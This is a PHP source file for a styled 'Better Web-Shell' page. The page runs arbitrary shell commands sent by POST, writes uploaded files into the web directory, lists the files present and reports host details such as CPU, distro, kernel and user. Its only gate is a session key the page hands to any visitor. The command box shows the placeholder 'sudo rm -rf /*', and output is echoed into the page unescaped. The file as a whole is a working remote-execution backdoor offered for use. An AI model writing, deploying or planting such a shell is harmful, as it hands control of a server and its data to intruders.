<?php

    session_start();
    
    function getKey() {
        return str_rot13(md5(uniqid((rand()+rand()), TRUE)));
    }

    $_SESSION['tmpKey'] = getKey();

?>
<!DOCTYPE html>
<html>
    <head>
        <meta charset="UTF-8">
        <meta http-equiv="X-UA-Compatible" content="IE=edge">
        <meta http-equiv="Content-Type" content="text/html; charset=utf-8">
        <meta name="viewport" content="width=device-width, initial-scale=1.0">
        <meta name="theme-color" content="dark">
        <title>Better Web-Shell</title>
        <style>
                    
            @import url('https://fonts.googleapis.com/css2?family=Poppins:wght@300&display=swap');

            body {
                margin: 0;
                padding: 0;
            
                width: 100%;
                height: 100vh;
            
                background: linear-gradient(45deg, #3d2456, #26385a, #3d2456) no-repeat fixed;
                color: #dbe3df;
            
                display: flex;
                flex-flow: row wrap;
                align-items: center;
                justify-content: center;
                align-content: center;
            
                font-family: 'Poppins', sans-serif;
                font-size: 16px;
                overflow: hidden;
            }

            * {
                user-zoom: none;
                box-sizing: border-box;
            }

            .no-select {
                user-select: none;
               -webkit-user-select: none;
               -webkit-touch-callout: none;
               -khtml-user-select: none;
               -moz-user-select: none;
               -ms-user-select: none;
               -o-user-select: none;
            }

            ::selection {
                background-color: #6c16a183;
            }

            *::-webkit-scrollbar {
                background: transparent !important;
                width: 0px !important;
                height: 0px !important;
            
                -ms-overflow-style: none !important; /* IE 11 */
                scrollbar-width: none !important; /* Firefox 64 */
                display: none !important; /* Default */
            }

            @-moz-document url-prefix() {
                /* Disable scrollbar Firefox */
                * {
                    scrollbar-width: none !important;
                }
            }

            #show-info {
                position: fixed;
                z-index: 0;
                top: 25px;
                right: 27px;
                cursor: pointer;
                opacity: 0.9;
            }

            #show-info:hover {
                opacity: 1;
            }

            #show-info svg {
                fill: #99a0a3;
                width: 28px;
                height: 28px;
            }

            #info:not(#info:target),
            #files:not(#files:target) {
                display: none !important;
            }

            #info, #files {
                position: fixed;
                z-index: 200;
                top: 0;
                left: 0;
                background-color: rgba(0, 0, 0, 0.4);
                backdrop-filter: blur(4px);
                -webkit-backdrop-filter: blur(4px);
                width: 100vw;
                height: 100vh;
                display: flex;
                flex-flow: column nowrap;
                justify-content: center;
                align-items: center;
            }

            #info > a.close,
            #files > a.close {
                text-decoration: none;
                color: #99a0a3;
                font-size: 15px;
                position: fixed;
                top: 25px;
                left: 28px;
                transform: scale(3);
                opacity: 0.9;
            }

            #info > a.close:hover,
            #files > a.close:hover {
                opacity: 1;
            }

            #info > div {
                max-width: 450px;
                margin: 32px;
                padding: 10px 32px;
                background: #0c111e;
                box-shadow: 0 0 16px 4px #00070c95, inset 0 0 2px 1px #02020d5b;
                border-radius: 14.6px;
            
                display: flex;
                flex-flow: column nowrap;
                justify-content: space-evenly;
                align-items: center;
            }

            #show-files {
                position: fixed;
                z-index: 0;
                top: 85px;
                right: 27px;
                cursor: pointer;
                opacity: 0.9;
            }

            #show-files:hover {
                opacity: 1;
            }

            #show-files svg {
                fill: #99a0a3;
                width: 28px;
                height: 28px;
            }

            #manage-file {
                width: 90vw;
                max-width: 480px;
                margin: 32px;
                /* padding: 10px 32px; */
                background: #0c111e;
                box-shadow: 0 0 16px 4px #00070c95, inset 0 0 2px 1px #02020d5b;
                border-radius: 14.6px;
                overflow: hidden;
            
                display: flex;
                flex-flow: column nowrap;
                justify-content: center;
                align-items: center;
            }

            #manage-file label[for="upload-file"] {
                background-color: #501984;
                padding: 10px;
                text-align: center;
                width: 100%;
                cursor: pointer;
                font-size: 16px;
            }

            #upload-file {
                display: none;
            }

            #list-file {
                color: #b5b9b7;
                width: 100%;
                max-height: 350px;
                display: flex;
                flex-flow: row wrap;
                justify-content: flex-start;
                align-items: flex-start;
                padding: 0 16px;
                border: none;
                list-style: none;
                overflow: scroll scroll;
            }

            #list-file li {
                padding: 10px;
            }

            #console {
                position: relative;
                width: 90vw;
                min-height: 100px;
                max-width: 720px;
                height: 360px;
                max-height: calc(100vh - 100px);
                border-radius: 1px;
                background: rgba(4, 4, 4, 0.995);
                color: #fff;
                outline: none;
                border: none;
                font-family: sans-serif;
                font-size: 16px;
            
               cursor: default;
            }

            #console pre {
                background-color: transparent;
                color: #b5b9b7;
                position: absolute;
                top: 0;
                left: 0;
                width: 100%;
                height: calc(100% - 40px);
                padding: 5px;
                margin: 0;
                overflow: auto auto;
            }

            #manage-cmd {
                position: absolute;
                bottom: 0;
                left: 0;
                width: 100%;
                height: 40px;
                display: flex;
                flex-flow: row nowrap;
                justify-content: space-between;
                align-items: center;
                background-color: #202024;
            }

            input, button {
                outline: none;
                border: none;
            }

            #manage-cmd input {
                background: rgba(80, 80, 80, 0.1);
                color: #dfdadf;
                width: calc(100% - 80px);
                padding: 5px 10px;
                font-size: 15px;
            }

            #manage-cmd input::placeholder {
                color: #a6a5a5b9;
            }

            #run-cmd {
                width: 50px;
                padding: 5px 10px;
                background: #35353a;
                color: #b5b9b7;
                box-sizing: border-box;
                border-radius: 5px;
                border: none;
                transition: all .3s ease-in-out;
                margin: 9px;
                display: flex;
                justify-content: center;
                align-items: center;
                cursor: pointer;
                opacity: 0.9;
            }

            .alert-box {
                position: fixed;
                top: 0;bottom: 0;
                left: 0;right: 0;
                width: 100vw;
                height: 100vh;
                background: transparent;
                z-index: 1000;
            }

            .alert-box .alert {
                position: absolute;
                z-index: 999;
                top: 22px;
                left: 25px;
                width: 312px;
                height: 64px;
                padding: 8px 18px;
                border-radius: 4px;
                box-shadow: 0 1px 10px 0 rgb(0 0 0 / 10%), 0 2px 15px 0 rgb(0 0 0 / 5%);
                background: #141414;
                font-size: 15px;
                font-family: sans-serif;
            }
        </style>
    </head>
    <body>

        <a href="#info" id="show-info">
            <svg fill="#000000" version="1.1" width="28px" height="28px" viewBox="0 0 416.979 416.979"><g><path d="M356.004,61.156c-81.37-81.47-213.377-81.551-294.848-0.182c-81.47,81.371-81.552,213.379-0.181,294.85 c81.369,81.47,213.378,81.551,294.849,0.181C437.293,274.636,437.375,142.626,356.004,61.156z M237.6,340.786 c0,3.217-2.607,5.822-5.822,5.822h-46.576c-3.215,0-5.822-2.605-5.822-5.822V167.885c0-3.217,2.607-5.822,5.822-5.822h46.576 c3.215,0,5.822,2.604,5.822,5.822V340.786z M208.49,137.901c-18.618,0-33.766-15.146-33.766-33.765 c0-18.617,15.147-33.766,33.766-33.766c18.619,0,33.766,15.148,33.766,33.766C242.256,122.755,227.107,137.901,208.49,137.901z"/></g></svg>
        </a>

        <section id="info">
            <a href="#" class="close no-select" >×</a>
            <div id="info-box">
                <?php

                function getBrowser() { // get Browser name
                    $user_agent = $_SERVER['HTTP_USER_AGENT'];
                    $browser        = "Unknown";
                    $browser_array  = array(
                        '/msie/i'       =>  'Internet Explorer',
                        '/firefox/i'    =>  'Firefox',
                        '/safari/i'     =>  'Safari',
                        '/chrome/i'     =>  'Chrome',
                        '/edge/i'       =>  'Edge',
                        '/opera/i'      =>  'Opera',
                        '/netscape/i'   =>  'Netscape',
                        '/maxthon/i'    =>  'Maxthon',
                        '/konqueror/i'  =>  'Konqueror',
                        '/mobile/i'     =>  'WebView'
                    );
                
                    foreach ( $browser_array as $regex => $value ) { 
                        if ( preg_match( $regex, $user_agent ) ) {
                            $browser = $value;
                        }
                    }
                    return $browser;
                }

                /* Browser */
                $browser = getBrowser();

                /* CPU */
                $cpu_file = fopen("/proc/cpuinfo", "r");
                error_reporting (E_ALL ^ E_NOTICE);
                while(($line = fgetcsv($cpu_file, 0, ":")) !== FALSE) {
                    $lines_array_cpu[] = $line[1];
                }
                fclose($cpu_file);
                $cpu = $lines_array_cpu[4];

                /* Distro */
                $distro_file = fopen("/etc/os-release", "r");
                while(($line = fgetcsv($distro_file, 0, "=")) !== FALSE) {
                    $lines_array_distro[] = $line[1];
                }
                fclose($distro_file);
                $distro = $lines_array_distro[2];

                /* Editor */
                $editor = getenv("EDITOR");

                /* Hostname */
                $hostname = file_get_contents("/etc/hostname");

                /* Kernel */
                $kernel = file_get_contents("/proc/sys/kernel/osrelease");

                /* Music */
                $music = shell_exec("rsmpc current");

                /* Package count */
                $pkg_list = array_filter(glob("/var/db/pkg/*/*/"), "is_dir");
                $pkgs = count($pkg_list, 0);

                /* Shell */
                $shell = getenv("SHELL");

                /* Uptime */
                $uptime_pre = file_get_contents("/proc/uptime");
                $uptime_array = explode(".", $uptime_pre);
                $uptime = $uptime_array[0];

                if ($uptime > 86400) {
                    $days_pre = $uptime / 60 / 60 / 24;
                    $days_pre = explode(".", $days_pre);
                    $days = ($days_pre[0] . "d");
                } else {
                    $days = "";
                }

                if ($uptime > 3600) {
                    $hours_pre = ($uptime / 60 / 60) % 24;
                    $hours = ($hours_pre . "h");
                } else {
                    $hours = "";
                }

                if ($uptime > 60) {
                    $minutes_pre = ($uptime / 60) % 60;
                    $minutes = ($minutes_pre . "m");
                } else {
                    $minutes = "less than one minute";
                }

                $uptime_message = ($days . " " . $hours . " " . $minutes);

                /* User */
                $user = getenv("USER");

                /* Asseble output into an array*/
                $output = array(
                    array("title"=>"Browser", "Info"=>"$browser"),
                    array("title"=>"CPU", "Info"=>"$cpu"),
                    array("title"=>"Distro", "Info"=>"$distro"),
                    array("title"=>"Editor", "Info"=>"$editor"),
                    array("title"=>"Hostname", "Info"=>"$hostname"),
                    array("title"=>"Kernel", "Info"=>"$kernel"),
                    array("title"=>"Packages (Portage)", "Info"=>"$pkgs"),
                    array("title"=>"Shell", "Info"=>"$shell"),
                    array("title"=>"Uptime", "Info"=>"$uptime_message"),
                    array("title"=>"User", "Info"=>"$user"),
                    array("title"=>"Music", "Info"=>"$music")
                );

                foreach ($output as $row){
                    if (strlen($row['Info']) < 1) { continue; }
                    echo "<p class=\"info-item\">$row[title] : $row[Info]</p>";
                } 

                ?>
            <div>
        </section>

        <?php

            function alert($text = '') {
                echo "<script type='text/JavaScript'>
const alertBox = document.createElement('section');
alertBox.classList.add('alert-box', 'no-select');
alertBox.onclick = event => alertBox.remove();
alertBox.innerHTML = `<div class='alert'><p>$text</p></div>`;
document.body.appendChild(alertBox);
</script>";
            }

            function setKey() {
                echo '<input type="hidden" name="key" value="'.$_SESSION['tmpKey'].'">';
            }

        ?>

        <a href="#files" id="show-files">
            <svg style="width: 28px; height: 28px;vertical-align: middle;fill: currentColor;overflow: hidden;" viewBox="0 0 1024 1024" version="1.1" ><path d="M800 192h-288a128 128 0 0 0-128-128H160a128 128 0 0 0-128 128v576a192 192 0 0 0 192 192h576a192 192 0 0 0 192-192V384a192 192 0 0 0-192-192z" fill="#99a0a3" /></svg>
        </a>

        <section id="files">
            <a href="#" class="close no-select" >×</a>
            <div id="files-box">

                <form action="" id="manage-file" method="POST" enctype="multipart/form-data">
                    <ul id="list-file">
                        <?php
                            $dir_handle = scandir('.');
                            foreach ($dir_handle as $key => $file_name) {
                                if ($file_name == '.' || $file_name == '..') {
                                    continue;
                                }
                                echo("<li>$file_name</li>");
                            }
                        ?>
                    </ul>
                    <label for="upload-file" class="no-select">
                        <span>Upload File</span>
                        <input type="file" name="file" class="upload-input" id="upload-file">
                    </label>
                    <?php setKey(); ?>
                </form>

                <?php
                    if(isset($_FILES['file'])){
                        if ($_POST['key']===$_SESSION['key']) {
                            $file_name = $_FILES['file']['name'];
                            $file_tmp =$_FILES['file']['tmp_name'];
                            move_uploaded_file($file_tmp, $file_name);
                            alert("File has been uploaded successfuly!");
                            http_response_code(200);
                        } else {
                            alert("There was a problem authentication.");
                            http_response_code(401);
                        }
                    }
                ?>
                
            <div>
        </section>

        <div id='console'>
            <pre spellcheck='false' readonly='readonly' unselectable='on'></pre>
            <?php
                    if(isset($_POST['sh']) && !empty($_POST['sh'])) {
                        if ($_POST['key']===$_SESSION['key']) {
                            $sh_res = shell_exec($_POST['sh']);
                            echo "<script type='text/JavaScript'>document.querySelector(\"#console > pre\").innerText = `$sh_res`</script>";
                            http_response_code(200);
                        } else {
                            alert("There was a problem authentication.");
                            http_response_code(401);
                        }
                    }
            ?>
            <form action="" id="manage-cmd" method="POST">
                <input name="sh" type="text" placeholder=" ~$ sudo rm -rf /*" spellcheck="false" class="command-input no-select" id="cmd">
                <?php setKey(); ?>
                <button class="btn no-select" type="submit" id="run-cmd">Run</button>
            </form>
        </div>

        
        <script type="text/JavaScript">
const formFile = document.querySelector('#manage-file');
const inputFile = document.querySelector('#upload-file');

const alertShow = text => {
    const alertBox = document.createElement('section');
    alertBox.classList.add('alert-box', 'no-select');
    alertBox.onclick = event => alertBox.remove();
    alertBox.innerHTML = `<div class='alert'><p>` + text + `</p></div>`;
    document.body.appendChild(alertBox);
}

formFile.addEventListener('submit', event => {
    if (inputFile.files.length === 0) {
        alertShow("First select a file !");
        event.preventDefault();
    }
});

inputFile.addEventListener('change', event => {
    if (inputFile.files.length !== 0) {
        formFile.submit();
    }
});

const cmdInput = document.querySelector('#cmd');
const runButton = document.querySelector('#run-cmd');

runButton.addEventListener('click', event => {
    if (cmdInput.value.trim() == '') event.preventDefault();
});

</script>
        <?php $_SESSION['key'] = $_SESSION['tmpKey']; ?>
    </body>
</html>
